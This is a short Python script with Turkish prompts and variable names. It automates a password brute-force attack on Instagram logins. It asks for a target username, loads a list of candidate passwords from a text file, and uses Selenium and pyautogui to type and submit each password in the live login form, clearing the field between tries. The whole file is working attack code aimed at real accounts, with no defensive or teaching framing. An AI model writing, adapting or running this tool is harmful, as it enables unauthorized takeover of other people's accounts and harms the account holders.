from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import pyautogui
import time

username = input("Kullanıcı Adını gir: ")
driver = webdriver.Chrome()
driver.get('https://www.instagram.com')
file = open('sifreler.txt', 'r', encoding='utf-8')

bruteforce = []
for line in file:
    line = line.strip()
    bruteforce.append(line)
file.close()
wait = WebDriverWait(driver, 15)
wait.until(EC.presence_of_element_located((By.NAME, 'username')))

username_field = driver.find_element(By.NAME, 'username')
username_field.send_keys(username)
password_field = driver.find_element(By.NAME, 'password')

for sire in bruteforce:
    password = sire
    password_field.send_keys(password)
    wait.until(EC.element_to_be_clickable((By.XPATH, '//button[@type="submit"]')))
    login_button = driver.find_element(By.XPATH, '//button[@type="submit"]')
    login_button.click()
    time.sleep(0.3)
    password_field.send_keys("")
    pyautogui.hotkey('ctrl', 'a')
    pyautogui.press('delete')


time.sleep(1)

driver.quit()
